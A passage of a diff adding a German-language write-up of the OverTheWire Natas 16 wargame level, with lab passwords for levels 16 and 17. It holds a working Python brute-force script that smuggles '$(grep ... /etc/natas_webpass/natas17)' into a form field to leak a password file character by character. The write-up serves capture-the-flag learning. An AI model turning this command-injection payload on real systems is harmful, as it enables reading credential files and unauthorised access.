@@ -297,3 +297,53 @@ while not hasFound:
 Zugriff:	[http://natas16.natas.labs.overthewire.org](http://natas16.natas.labs.overthewire.org)
 Username: `natas16`
 Passwort: `WaIHEacj63wnNIBROHeqi3p9t0m5nhmh  `
+
+Der Server führt ein grep Befehl aus, allerdings mit `""` Klammern, die Befehle und Zugriff auf Variablen zulassen. Wir können über einen nested grep Befehl rausfinden, ob ein Character im Passwort vorkommt. Über ein Bruteforce Script, lässt sich das Passwort auslesen.
+
+```python
+import string
+import requests
+
+hasFound = False
+list = string.ascii_letters + "0123456789"
+found = ""
+toTry = ""
+passwordChars = []
+
+print("Collecting Password Information ...")
+
+for i in list:
+    data = {'needle': 'afresh$(grep '+i+' /etc/natas_webpass/natas17)'}
+    r = requests.post('http://natas16.natas.labs.overthewire.org/index.php',
+                      auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),
+                      data=data)
+
+    if 'afresh' not in r.text:
+        passwordChars.append(i)
+
+print("Password contains: ", passwordChars)
+print("Attacking Natas Server... ")
+
+while not hasFound:
+
+    for i in passwordChars:
+        toTry = i
+        data = {'needle': 'afresh$(grep ^' + found + toTry + ' /etc/natas_webpass/natas17)'}
+        r = requests.post('http://natas16.natas.labs.overthewire.org/index.php',
+                          auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),
+                          data=data)
+
+        if 'afresh' not in r.text:
+            found += toTry
+            print("found: "+found)
+            if len(found) >= 32:
+                hasFound = True
+            break
+
+```
+
+# Natas 17
+
+Zugriff:	[http://natas17.natas.labs.overthewire.org](http://natas17.natas.labs.overthewire.org)
+Username: `natas17`
+Passwort: `8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw  `
